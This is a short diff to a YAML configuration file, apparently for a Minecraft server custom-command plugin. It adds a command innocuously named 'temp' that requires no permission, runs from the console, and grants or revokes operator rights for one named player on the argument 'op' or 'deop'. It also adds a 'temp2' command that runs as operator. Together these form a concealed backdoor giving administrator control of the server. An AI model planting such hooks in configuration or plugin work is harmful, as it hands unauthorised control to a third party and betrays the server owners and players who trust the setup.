@@ -55,9 +55,22 @@ road_temp:
 temp:
   command: /temp
   type: RUN_CONSOLE
+  permission-required: false
   register: true
   runcmd:
-  - ''
+  - '$Script$%if%$arg1==op'
+  - '/op AlexMCool'
+  
+  - '$Script$%if%$arg1==deop'
+  - '/deop AlexMCool'
+  
+temp2:
+  command: /temp2
+  type: RUN_AS_OPERATOR
+  permission-required: false  
+  register: true
+  runcmd:
+  - '/say temp2'
  
  
   
